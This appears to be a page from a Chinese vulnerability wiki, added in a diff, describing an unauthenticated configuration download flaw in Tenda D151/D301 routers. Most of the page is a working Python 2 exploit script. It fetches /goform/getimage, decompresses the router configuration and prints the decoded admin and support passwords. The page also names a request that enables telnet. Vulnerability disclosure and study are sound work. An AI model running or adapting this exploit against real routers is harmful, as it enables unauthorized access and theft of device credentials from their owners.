@@ -1,0 +1,287 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+  
+  
+    <meta charset="utf-8">
+    <meta http-equiv="X-UA-Compatible" content="IE=edge">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    
+    <meta name="author" content="内部使用">
+    <link rel="canonical" href="https://secnn.com/%E7%BD%91%E7%BB%9C%E8%AE%BE%E5%A4%87%E6%BC%8F%E6%B4%9E/%E8%85%BE%E8%BE%BE%20%E8%B7%AF%E7%94%B1%E5%99%A8%20D151D31%E6%9C%AA%E7%BB%8F%E8%BA%AB%E4%BB%BD%E9%AA%8C%E8%AF%81%E7%9A%84%E9%85%8D%E7%BD%AE%E4%B8%8B%E8%BD%BD/">
+    <link rel="shortcut icon" href="../../favicon.ico">
+    
+    <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=0" />
+    <title>腾达路由器 D151/D31未经身份验证的配置下载 - SecNN-Wiki漏洞库管理系统&网络安全知识库-本Wiki所有信息来源于公开漏洞数据库</title>
+    <link href="../../css/bootstrap-3.3.7.min.css" rel="stylesheet">
+    <link href="../../css/font-awesome-4.7.0.css" rel="stylesheet">
+    <link href="../../css/base.css" rel="stylesheet">
+    <link rel="stylesheet" href="../../css/highlight.css">
+    <!-- HTML5 shim and Respond.js IE8 support of HTML5 elements and media queries -->
+    <!--[if lt IE 9]>
+        <script src="https://oss.maxcdn.com/libs/html5shiv/3.7.0/html5shiv.js"></script>
+        <script src="https://oss.maxcdn.com/libs/respond.js/1.3.0/respond.min.js"></script>
+    <![endif]-->
+
+    <script src="../../js/jquery-3.2.1.min.js"></script>
+    <script src="../../js/bootstrap-3.3.7.min.js"></script>
+    <script src="../../js/highlight.pack.js"></script>
+    
+    <base target="_top">
+    <script>
+      var base_url = '../..';
+      var is_top_frame = false;
+        
+        var pageToc = [
+          {title: "\u817e\u8fbe\u8def\u7531\u5668 D151/D31\u672a\u7ecf\u8eab\u4efd\u9a8c\u8bc1\u7684\u914d\u7f6e\u4e0b\u8f7d", url: "#_top", children: [
+              {title: "\u6f0f\u6d1e\u63cf\u8ff0", url: "#_1" },
+              {title: "\u6f0f\u6d1e\u5f71\u54cd", url: "#_2" },
+              {title: "\u6f0f\u6d1e\u590d\u73b0", url: "#_3" },
+          ]},
+        ];
+
+    </script>
+    <script src="../../js/base.js"></script>
+      <script src="../../search/main.js"></script> 
+</head>
+
+<body>
+<script>
+if (is_top_frame) { $('body').addClass('wm-top-page'); }
+</script>
+
+
+
+<div class="container-fluid wm-page-content">
+  <a name="_top"></a>
+    
+
+    
+    
+      
+    
+
+  <div class="row wm-article-nav-buttons" role="navigation" aria-label="navigation">
+    
+    <div class="wm-article-nav pull-right">
+      <a href="../%E8%9C%82%E7%BD%91%E4%BA%92%E8%81%94%20%E4%BC%81%E4%B8%9A%E7%BA%A7%E8%B7%AF%E7%94%B1%E5%99%A8v4.31%20%E5%AF%86%E7%A0%81%E6%B3%84%E9%9C%B2%E6%BC%8F%E6%B4%9E%20CVE-2019-16313/" class="btn btn-xs btn-default pull-right">
+        Next
+        <i class="fa fa-chevron-right" aria-hidden="true"></i>
+      </a>
+      <a href="../%E8%9C%82%E7%BD%91%E4%BA%92%E8%81%94%20%E4%BC%81%E4%B8%9A%E7%BA%A7%E8%B7%AF%E7%94%B1%E5%99%A8v4.31%20%E5%AF%86%E7%A0%81%E6%B3%84%E9%9C%B2%E6%BC%8F%E6%B4%9E%20CVE-2019-16313/" class="btn btn-xs btn-link">
+        蜂网互联 企业级路由器v4.31 密码泄露漏洞 CVE-2019-16313
+      </a>
+    </div>
+    
+    <div class="wm-article-nav">
+      <a href="../%E8%85%BE%E8%BE%BE%20%E8%B7%AF%E7%94%B1%E5%99%A8%20AC11%20%E5%A0%86%E6%A0%88%E7%BC%93%E5%86%B2%E5%8C%BA%E6%BA%A2%E5%87%BA%20CVE-2021-31758/" class="btn btn-xs btn-default pull-left">
+        <i class="fa fa-chevron-left" aria-hidden="true"></i>
+        Previous</a><a href="../%E8%85%BE%E8%BE%BE%20%E8%B7%AF%E7%94%B1%E5%99%A8%20AC11%20%E5%A0%86%E6%A0%88%E7%BC%93%E5%86%B2%E5%8C%BA%E6%BA%A2%E5%87%BA%20CVE-2021-31758/" class="btn btn-xs btn-link">
+        腾达路由器 AC11 堆栈缓冲区溢出 CVE-2021-31758
+      </a>
+    </div>
+    
+  </div>
+
+    
+
+    <h1 id="d151d31">腾达路由器 D151/D31未经身份验证的配置下载<a class="headerlink" href="#d151d31" title="Permanent link">&para;</a></h1>
+<h2 id="_1">漏洞描述<a class="headerlink" href="#_1" title="Permanent link">&para;</a></h2>
+<p>攻击者可利用此漏洞，通过请求{IP}/goform/getimage即可下载当前路由器配置（包括管理员登录名），也可以通过请求激活telnet服务/goform/telnet（默认情况下该服务已启用）。</p>
+<h2 id="_2">漏洞影响<a class="headerlink" href="#_2" title="Permanent link">&para;</a></h2>
+<div class="highlight"><pre><span></span><code>D301 1.2.11.2_EN
+D301 V2.0 50.22.1.8_EN
+D151 V2.0 50.21.1.5_EN
+</code></pre></div>
+<h2 id="_3">漏洞复现<a class="headerlink" href="#_3" title="Permanent link">&para;</a></h2>
+<p>poc：</p>
+<div class="highlight"><pre><span></span><code><span class="kn">import</span><span class="w"> </span><span class="nn">struct</span>
+<span class="kn">import</span><span class="w"> </span><span class="nn">itertools</span>
+<span class="kn">import</span><span class="w"> </span><span class="nn">random</span><span class="o">,</span><span class="w"> </span><span class="nn">sys</span>
+<span class="kn">import</span><span class="w"> </span><span class="nn">requests</span>
+<span class="kn">import</span><span class="w"> </span><span class="nn">base64</span>
+
+
+
+<span class="n">FETCH_CODE</span> <span class="o">=</span> <span class="s2">&quot;</span><span class="se">\x80\x0f\x07\xe7\x83</span><span class="s2">i</span><span class="se">\xb0</span><span class="s2">@v2</span><span class="se">\x9c\x8e</span><span class="s2">f</span><span class="se">\x93</span><span class="s2">y</span><span class="se">\xb8</span><span class="s2">z&quot;</span>
+<span class="n">ADMIN_LOG_CFG</span> <span class="o">=</span> <span class="p">{</span><span class="s1">&#39;AdminPassword&#39;</span><span class="p">:</span> <span class="s1">&#39;admin&#39;</span><span class="p">,</span> <span class="s1">&#39;SupportPassword&#39;</span><span class="p">:</span> <span class="s1">&#39;support&#39;</span><span class="p">}</span>
+
+<span class="n">CLEAR_CODE</span> <span class="o">=</span> <span class="mi">256</span>
+<span class="n">END_OF_CODE</span> <span class="o">=</span> <span class="n">CLEAR_CODE</span> <span class="o">+</span> <span class="mi">1</span>
+
+<span class="n">MIN_WIDTH</span> <span class="o">=</span> <span class="mi">8</span>
+<span class="n">DEFAULT_MIN_BITS</span> <span class="o">=</span> <span class="n">MIN_WIDTH</span> <span class="o">+</span> <span class="mi">1</span>
+<span class="n">DEFAULT_MAX_BITS</span> <span class="o">=</span> <span class="mi">12</span>
+
+
+
+
+<span class="k">def</span><span class="w"> </span><span class="nf">cmsDecoder</span><span class="p">(</span><span class="n">compressed_cfg</span><span class="p">):</span>
+    <span class="n">_cp_dict</span> <span class="o">=</span> <span class="nb">dict</span><span class="p">((</span><span class="n">pt</span><span class="p">,</span> <span class="n">struct</span><span class="o">.</span><span class="n">pack</span><span class="p">(</span><span class="s2">&quot;B&quot;</span><span class="p">,</span> <span class="n">pt</span><span class="p">))</span> <span class="k">for</span> <span class="n">pt</span> <span class="ow">in</span> <span class="nb">range</span><span class="p">(</span><span class="mi">256</span><span class="p">))</span>
+    <span class="n">_cp_dict</span><span class="p">[</span><span class="n">CLEAR_CODE</span><span class="p">]</span> <span class="o">=</span> <span class="n">CLEAR_CODE</span>
+    <span class="n">_cp_dict</span><span class="p">[</span><span class="n">END_OF_CODE</span><span class="p">]</span> <span class="o">=</span> <span class="n">END_OF_CODE</span>
+    <span class="n">prefix</span><span class="p">,</span> <span class="n">offset</span><span class="p">,</span> <span class="n">ignore</span> <span class="o">=</span> <span class="kc">None</span><span class="p">,</span> <span class="mi">0</span><span class="p">,</span> <span class="mi">0</span>
+    <span class="n">codepoints_arr</span><span class="p">,</span> <span class="n">remainder</span><span class="p">,</span> <span class="n">bits</span> <span class="o">=</span> <span class="p">[],</span> <span class="p">[],</span> <span class="p">[]</span>
+
+    <span class="n">init_csize</span> <span class="o">=</span> <span class="nb">len</span><span class="p">(</span><span class="n">_cp_dict</span><span class="p">)</span>
+
+    <span class="n">codesize</span> <span class="o">=</span> <span class="n">init_csize</span>
+    <span class="n">minwidth</span> <span class="o">=</span> <span class="n">MIN_WIDTH</span>
+    <span class="k">while</span> <span class="p">(</span><span class="mi">1</span> <span class="o">&lt;&lt;</span> <span class="n">minwidth</span><span class="p">)</span> <span class="o">&lt;</span> <span class="n">codesize</span><span class="p">:</span>
+        <span class="n">minwidth</span> <span class="o">=</span> <span class="n">minwidth</span> <span class="o">+</span> <span class="mi">1</span>
+    <span class="n">pointwidth</span> <span class="o">=</span> <span class="n">minwidth</span>
+
+    <span class="n">buts_arr</span> <span class="o">=</span> <span class="p">[]</span>
+    <span class="k">for</span> <span class="n">b</span> <span class="ow">in</span> <span class="n">compressed_cfg</span><span class="p">:</span>
+        <span class="n">value</span> <span class="o">=</span> <span class="n">struct</span><span class="o">.</span><span class="n">unpack</span><span class="p">(</span><span class="s2">&quot;B&quot;</span><span class="p">,</span> <span class="n">b</span><span class="p">)[</span><span class="mi">0</span><span class="p">]</span>
+        <span class="k">for</span> <span class="n">bitplusone</span> <span class="ow">in</span> <span class="nb">range</span><span class="p">(</span><span class="mi">8</span><span class="p">,</span> <span class="mi">0</span><span class="p">,</span> <span class="o">-</span><span class="mi">1</span><span class="p">):</span>
+            <span class="n">bitindex</span> <span class="o">=</span> <span class="n">bitplusone</span> <span class="o">-</span> <span class="mi">1</span>
+            <span class="n">buts_arr</span><span class="o">.</span><span class="n">append</span><span class="p">(</span><span class="mi">1</span> <span class="o">&amp;</span> <span class="p">(</span><span class="n">value</span> <span class="o">&gt;&gt;</span> <span class="n">bitindex</span><span class="p">))</span>
+
+    <span class="k">for</span> <span class="n">nextbit</span> <span class="ow">in</span> <span class="n">buts_arr</span><span class="p">:</span>
+        <span class="n">offset</span> <span class="o">=</span> <span class="p">(</span><span class="n">offset</span> <span class="o">+</span> <span class="mi">1</span><span class="p">)</span> <span class="o">%</span> <span class="mi">8</span>
+        <span class="k">if</span> <span class="n">ignore</span> <span class="o">&gt;</span> <span class="mi">0</span><span class="p">:</span>
+            <span class="n">ignore</span> <span class="o">=</span> <span class="n">ignore</span> <span class="o">-</span> <span class="mi">1</span>
+            <span class="k">continue</span>
+        <span class="n">bits</span><span class="o">.</span><span class="n">append</span><span class="p">(</span><span class="n">nextbit</span><span class="p">)</span>
+        <span class="k">if</span> <span class="nb">len</span><span class="p">(</span><span class="n">bits</span><span class="p">)</span> <span class="o">==</span> <span class="n">pointwidth</span><span class="p">:</span>
+            <span class="n">cp_int</span> <span class="o">=</span> <span class="mi">0</span>
+            <span class="n">lsb_first</span> <span class="o">=</span> <span class="p">[</span><span class="n">b</span> <span class="k">for</span> <span class="n">b</span> <span class="ow">in</span> <span class="n">bits</span><span class="p">]</span>
+            <span class="n">lsb_first</span><span class="o">.</span><span class="n">reverse</span><span class="p">()</span>
+            <span class="k">for</span> <span class="n">bit_index</span> <span class="ow">in</span> <span class="nb">range</span><span class="p">(</span><span class="nb">len</span><span class="p">(</span><span class="n">lsb_first</span><span class="p">)):</span>
+                <span class="k">if</span> <span class="n">lsb_first</span><span class="p">[</span><span class="n">bit_index</span><span class="p">]:</span>
+                    <span class="n">cp_int</span> <span class="o">=</span> <span class="n">cp_int</span> <span class="o">|</span> <span class="p">(</span><span class="mi">1</span> <span class="o">&lt;&lt;</span> <span class="n">bit_index</span><span class="p">)</span>
+
+            <span class="n">bits</span> <span class="o">=</span> <span class="p">[]</span>
+            <span class="n">codepoints_arr</span><span class="o">.</span><span class="n">append</span><span class="p">(</span><span class="n">cp_int</span><span class="p">)</span>
+            <span class="n">codesize</span> <span class="o">=</span> <span class="n">codesize</span> <span class="o">+</span> <span class="mi">1</span>
+            <span class="k">if</span> <span class="n">cp_int</span> <span class="ow">in</span> <span class="p">[</span><span class="n">CLEAR_CODE</span><span class="p">,</span> <span class="n">END_OF_CODE</span><span class="p">]:</span>
+                <span class="n">codesize</span> <span class="o">=</span> <span class="n">init_csize</span>
+                <span class="n">pointwidth</span> <span class="o">=</span> <span class="n">minwidth</span>
+            <span class="k">else</span><span class="p">:</span>
+                <span class="k">while</span> <span class="n">codesize</span> <span class="o">&gt;=</span> <span class="p">(</span><span class="mi">2</span> <span class="o">**</span> <span class="n">pointwidth</span><span class="p">):</span>
+                    <span class="n">pointwidth</span> <span class="o">=</span> <span class="n">pointwidth</span> <span class="o">+</span> <span class="mi">1</span>
+            <span class="k">if</span> <span class="n">cp_int</span> <span class="o">==</span> <span class="n">END_OF_CODE</span><span class="p">:</span>
+                <span class="n">ignore</span> <span class="o">=</span> <span class="p">(</span><span class="mi">8</span> <span class="o">-</span> <span class="n">offset</span><span class="p">)</span> <span class="o">%</span> <span class="mi">8</span>
+
+
+    <span class="n">decodedBytes</span> <span class="o">=</span> <span class="p">[]</span>
+    <span class="k">for</span> <span class="n">cp_int</span> <span class="ow">in</span> <span class="n">codepoints_arr</span><span class="p">:</span>
+
+        <span class="n">suffix</span> <span class="o">=</span> <span class="s2">&quot;&quot;</span>
+        <span class="k">if</span> <span class="n">cp_int</span> <span class="o">==</span> <span class="n">CLEAR_CODE</span><span class="p">:</span>
+            <span class="n">_cp_dict</span> <span class="o">=</span> <span class="nb">dict</span><span class="p">((</span><span class="n">pt</span><span class="p">,</span> <span class="n">struct</span><span class="o">.</span><span class="n">pack</span><span class="p">(</span><span class="s2">&quot;B&quot;</span><span class="p">,</span> <span class="n">pt</span><span class="p">))</span> <span class="k">for</span> <span class="n">pt</span> <span class="ow">in</span> <span class="nb">range</span><span class="p">(</span><span class="mi">256</span><span class="p">))</span>
+            <span class="n">_cp_dict</span><span class="p">[</span><span class="n">CLEAR_CODE</span><span class="p">]</span> <span class="o">=</span> <span class="n">CLEAR_CODE</span>
+            <span class="n">_cp_dict</span><span class="p">[</span><span class="n">END_OF_CODE</span><span class="p">]</span> <span class="o">=</span> <span class="n">END_OF_CODE</span>
+            <span class="n">prefix</span> <span class="o">=</span> <span class="kc">None</span>
+
+        <span class="k">elif</span> <span class="n">cp_int</span> <span class="o">!=</span> <span class="n">END_OF_CODE</span><span class="p">:</span>
+            <span class="k">if</span> <span class="n">cp_int</span> <span class="ow">in</span> <span class="n">_cp_dict</span><span class="p">:</span>
+                <span class="n">suffix</span> <span class="o">=</span> <span class="n">_cp_dict</span><span class="p">[</span><span class="n">cp_int</span><span class="p">]</span>
+                <span class="k">if</span> <span class="kc">None</span> <span class="o">!=</span> <span class="n">prefix</span><span class="p">:</span>
+                    <span class="n">_cp_dict</span><span class="p">[</span><span class="nb">len</span><span class="p">(</span><span class="n">_cp_dict</span><span class="p">)]</span> <span class="o">=</span> <span class="n">prefix</span> <span class="o">+</span> <span class="n">suffix</span><span class="p">[</span><span class="mi">0</span><span class="p">]</span>
+            <span class="k">else</span><span class="p">:</span>
+                <span class="n">suffix</span> <span class="o">=</span> <span class="n">prefix</span> <span class="o">+</span> <span class="n">prefix</span><span class="p">[</span><span class="mi">0</span><span class="p">]</span>
+                <span class="n">_cp_dict</span><span class="p">[</span><span class="nb">len</span><span class="p">(</span><span class="n">_cp_dict</span><span class="p">)]</span> <span class="o">=</span> <span class="n">suffix</span>
+            <span class="n">prefix</span> <span class="o">=</span> <span class="n">suffix</span>
+        <span class="n">decoded</span> <span class="o">=</span> <span class="n">suffix</span>
+        <span class="k">for</span> <span class="n">char</span> <span class="ow">in</span> <span class="n">decoded</span><span class="p">:</span>
+            <span class="n">decodedBytes</span><span class="o">.</span><span class="n">append</span><span class="p">(</span><span class="n">char</span><span class="p">)</span>
+    <span class="k">return</span> <span class="n">decodedBytes</span>
+
+
+
+
+
+
+<span class="k">def</span><span class="w"> </span><span class="nf">exploit</span><span class="p">(</span><span class="n">ip</span><span class="p">):</span>
+    <span class="nb">print</span> <span class="s2">&quot;[!] Downloading config&quot;</span>
+    <span class="k">try</span><span class="p">:</span>
+        <span class="n">r</span> <span class="o">=</span> <span class="n">requests</span><span class="o">.</span><span class="n">get</span><span class="p">(</span><span class="s2">&quot;http://</span><span class="si">{}</span><span class="s2">/goform/getimage&quot;</span><span class="o">.</span><span class="n">format</span><span class="p">(</span><span class="n">ip</span><span class="p">))</span>
+        <span class="k">pass</span>
+    <span class="k">except</span><span class="p">:</span>
+        <span class="nb">print</span> <span class="s2">&quot;[-] Failed to download the config, the target may not be vulnerable&quot;</span>
+
+    <span class="n">BIN_CONTENT</span> <span class="o">=</span> <span class="n">r</span><span class="o">.</span><span class="n">content</span>
+    <span class="n">BIN_CONTENT</span> <span class="o">=</span> <span class="n">BIN_CONTENT</span><span class="p">[</span><span class="n">BIN_CONTENT</span><span class="o">.</span><span class="n">index</span><span class="p">(</span><span class="n">FETCH_CODE</span><span class="p">):][:</span><span class="mi">16</span><span class="o">*</span><span class="mi">50</span><span class="p">]</span>
+
+    <span class="n">CONFIG_XML</span> <span class="o">=</span> <span class="sa">b</span><span class="s2">&quot;&quot;</span><span class="o">.</span><span class="n">join</span><span class="p">(</span><span class="n">cmsDecoder</span><span class="p">(</span><span class="n">BIN_CONTENT</span><span class="p">))</span>
+
+    <span class="n">USER_</span><span class="p">,</span> <span class="n">PASS_</span> <span class="o">=</span> <span class="s2">&quot;&quot;</span><span class="p">,</span> <span class="s2">&quot;&quot;</span>
+    <span class="k">for</span> <span class="n">i</span> <span class="ow">in</span> <span class="n">ADMIN_LOG_CFG</span><span class="o">.</span><span class="n">keys</span><span class="p">():</span>
+        <span class="k">if</span> <span class="n">i</span> <span class="ow">in</span> <span class="n">CONFIG_XML</span><span class="p">:</span>
+            <span class="n">CONFIG_XML</span> <span class="o">=</span> <span class="n">CONFIG_XML</span><span class="p">[</span><span class="n">CONFIG_XML</span><span class="o">.</span><span class="n">index</span><span class="p">(</span><span class="n">i</span><span class="p">)</span> <span class="o">+</span> <span class="nb">len</span><span class="p">(</span><span class="n">i</span><span class="p">)</span> <span class="o">+</span> <span class="mi">1</span><span class="p">:]</span>
+            <span class="n">PASS_</span> <span class="o">=</span> <span class="n">CONFIG_XML</span><span class="p">[:</span><span class="n">CONFIG_XML</span><span class="o">.</span><span class="n">index</span><span class="p">(</span><span class="s1">&#39;&lt;/&#39;</span><span class="p">)]</span>
+            <span class="n">USER_</span> <span class="o">=</span> <span class="n">ADMIN_LOG_CFG</span><span class="p">[</span><span class="n">i</span><span class="p">]</span>
+            <span class="nb">print</span> <span class="s2">&quot;</span><span class="se">\t</span><span class="s2">username: </span><span class="si">{}</span><span class="se">\n\t</span><span class="s2">password: </span><span class="si">{}</span><span class="se">\n</span><span class="s2">&quot;</span><span class="o">.</span><span class="n">format</span><span class="p">(</span><span class="n">USER_</span><span class="p">,</span> <span class="n">base64</span><span class="o">.</span><span class="n">b64decode</span><span class="p">(</span><span class="n">PASS_</span><span class="p">)</span><span class="o">.</span><span class="n">rstrip</span><span class="p">(</span><span class="s1">&#39;</span><span class="se">\x00</span><span class="s1">&#39;</span><span class="p">))</span>
+            <span class="k">return</span> <span class="mi">0</span>
+    <span class="nb">print</span> <span class="s2">&quot;[-] Failed to decode the config file</span><span class="se">\n</span><span class="s2">&quot;</span>
+    <span class="k">return</span> <span class="o">-</span><span class="mi">1</span>
+
+
+
+<span class="k">if</span> <span class="nb">len</span><span class="p">(</span><span class="n">sys</span><span class="o">.</span><span class="n">argv</span><span class="p">)</span> <span class="o">==</span> <span class="mi">1</span><span class="p">:</span>
+    <span class="nb">print</span> <span class="s2">&quot;usage: python2 &quot;</span> <span class="o">+</span> <span class="n">sys</span><span class="o">.</span><span class="n">argv</span><span class="p">[</span><span class="mi">0</span><span class="p">]</span> <span class="o">+</span> <span class="s2">&quot; router_ip&quot;</span>
+    <span class="nb">print</span> <span class="s2">&quot;example: python2 exploit.py http://192.168.1.1&quot;</span>
+    <span class="n">exit</span><span class="p">()</span>
+
+
+
+<span class="k">if</span> <span class="vm">__name__</span> <span class="o">==</span> <span class="s2">&quot;__main__&quot;</span><span class="p">:</span>
+
+    <span class="nb">print</span> <span class="s2">&quot;&quot;&quot;</span><span class="se">\</span>
+<span class="s2">        _  _</span>
+<span class="s2">  ___ (~ )( ~)</span>
+<span class="s2"> /   \_\ \/ /   </span>
+<span class="s2">|   D_ ]\ \/  -- By BenCh@li@h</span>
+<span class="s2">|   D _]/\ \  -- BenChaliah@github</span>
+<span class="s2"> \___/ / /\ </span><span class="se">\\</span>
+<span class="s2">      (_ )( _)</span>
+
+<span class="s2">&quot;&quot;&quot;</span>
+
+    <span class="k">try</span><span class="p">:</span>
+        <span class="n">exploit</span><span class="p">(</span><span class="n">sys</span><span class="o">.</span><span class="n">argv</span><span class="p">[</span><span class="mi">1</span><span class="p">])</span>
+    <span class="k">except</span> <span class="ne">Exception</span> <span class="k">as</span> <span class="n">e</span><span class="p">:</span>
+        <span class="nb">print</span> <span class="nb">str</span><span class="p">(</span><span class="n">e</span><span class="p">)</span>
+</code></pre></div>
+
+  <br>
+    
+
+    
+    
+      
+    
+
+  <div class="row wm-article-nav-buttons" role="navigation" aria-label="navigation">
+    
+    <div class="wm-article-nav pull-right">
+      <a href="../%E8%9C%82%E7%BD%91%E4%BA%92%E8%81%94%20%E4%BC%81%E4%B8%9A%E7%BA%A7%E8%B7%AF%E7%94%B1%E5%99%A8v4.31%20%E5%AF%86%E7%A0%81%E6%B3%84%E9%9C%B2%E6%BC%8F%E6%B4%9E%20CVE-2019-16313/" class="btn btn-xs btn-default pull-right">
+        Next
+        <i class="fa fa-chevron-right" aria-hidden="true"></i>
+      </a>
+      <a href="../%E8%9C%82%E7%BD%91%E4%BA%92%E8%81%94%20%E4%BC%81%E4%B8%9A%E7%BA%A7%E8%B7%AF%E7%94%B1%E5%99%A8v4.31%20%E5%AF%86%E7%A0%81%E6%B3%84%E9%9C%B2%E6%BC%8F%E6%B4%9E%20CVE-2019-16313/" class="btn btn-xs btn-link">
+        蜂网互联 企业级路由器v4.31 密码泄露漏洞 CVE-2019-16313
+      </a>
+    </div>
+    
+    <div class="wm-article-nav">
+      <a href="../%E8%85%BE%E8%BE%BE%20%E8%B7%AF%E7%94%B1%E5%99%A8%20AC11%20%E5%A0%86%E6%A0%88%E7%BC%93%E5%86%B2%E5%8C%BA%E6%BA%A2%E5%87%BA%20CVE-2021-31758/" class="btn btn-xs btn-default pull-left">
+        <i class="fa fa-chevron-left" aria-hidden="true"></i>
+        Previous</a><a href="../%E8%85%BE%E8%BE%BE%20%E8%B7%AF%E7%94%B1%E5%99%A8%20AC11%20%E5%A0%86%E6%A0%88%E7%BC%93%E5%86%B2%E5%8C%BA%E6%BA%A2%E5%87%BA%20CVE-2021-31758/" class="btn btn-xs btn-link">
+        腾达路由器 AC11 堆栈缓冲区溢出 CVE-2021-31758
+      </a>
+    </div>
+    
+  </div>
+
+    <br>
+</div>
+
+<footer class="col-md-12 wm-page-content"><p>Copyright © 2025 SecNN-Wiki</p>
+  <p>Documentation built with <a href="http://www.mkdocs.org/">MkDocs</a> using <a href="None">Windmill Dark</a> theme by 内部使用 (noraj).</p>
+</footer>
+
+</body>
+</html>
